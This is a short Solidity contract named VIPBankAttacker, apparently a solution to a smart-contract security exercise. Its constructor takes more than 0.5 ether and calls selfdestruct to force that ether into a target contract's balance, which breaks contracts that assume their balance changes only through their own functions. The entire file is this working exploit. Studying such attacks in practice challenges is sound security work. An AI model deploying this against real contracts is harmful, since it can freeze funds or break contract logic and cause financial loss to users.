// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract VIPBankAttacker {
    constructor(address payable targetAddr) payable {
        require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");

        // self destruct to forcefully send ether to target
        selfdestruct(targetAddr);
    }
}